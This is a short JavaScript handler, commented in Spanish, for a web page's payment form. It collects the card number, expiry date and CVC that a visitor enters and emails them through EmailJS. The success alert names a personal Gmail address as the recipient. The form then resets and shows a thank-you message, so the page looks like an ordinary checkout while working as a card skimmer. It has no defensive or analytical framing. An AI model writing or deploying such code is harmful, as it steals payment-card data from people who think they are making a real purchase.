// Inicializa EmailJS con tu User ID
(function() {
    emailjs.init('TU_USER_ID'); // Reemplaza con tu User ID de EmailJS
})();

// Escucha el evento "submit" del formulario
document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Evita que el formulario se envíe de forma tradicional

    // Recopila los datos del formulario
    const cardData = {
        numero: this.querySelector('input[type="text"]').value, // Número de tarjeta
        fecha: this.querySelector('input[type="month"]').value, // Fecha de expiración
        cvc: this.querySelector('input[type="text"]:last-child').value // CVC
    };

    // Envía los datos a tu correo usando EmailJS
    emailjs.send("service_syrc1uk", "template_u3etoro", cardData)
        .then(() => {
            alert('Datos enviados a karentre100@gmail.com'); // Muestra un mensaje de éxito
            document.getElementById('paymentForm').reset(); // Limpia el formulario
            document.getElementById('thankYouMessage').classList.remove('hidden'); // Muestra el mensaje de agradecimiento
        })
        .catch(error => {
            alert('Error: No se pudo enviar el correo'); // Muestra un mensaje de error
            console.error(error); // Imprime el error en la consola
        });
});
